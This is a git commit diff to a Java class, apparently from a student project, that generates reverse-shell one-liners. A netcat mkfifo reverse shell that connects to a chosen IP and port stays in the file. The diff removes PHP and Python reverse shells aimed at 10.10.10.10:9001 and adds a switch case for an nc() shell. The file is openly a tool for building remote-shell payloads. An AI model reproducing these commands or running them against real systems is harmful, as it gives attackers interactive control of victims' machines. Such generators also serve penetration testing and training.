3f39f22d83f76a0a79b86a22edd96405c00124df
Salvador <si727218@iteso.mx>
2021-11-30 11:26:12 -0600

    Update shells.java

--- shells.java
+++ shells.java
@@ -50,18 +50,13 @@ public class shells {
         shell = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc " + IP + " " + port + " >/tmp/f";
     }
 
-    public void PHP(){
-        shell = "php -r '$sock=fsockopen(\"10.10.10.10\",9001);exec(\"sh <&3 >&3 2>&3\");'";
-    }
-
-    public void Python(){
-        shell = "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.10.10\",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'";
-    }
-
     public void shellify(){
         switch (tipoShell){
             case 1:
                 Bash();
+                break;
+            case 2:
+                nc();
                 break;
         }
     }
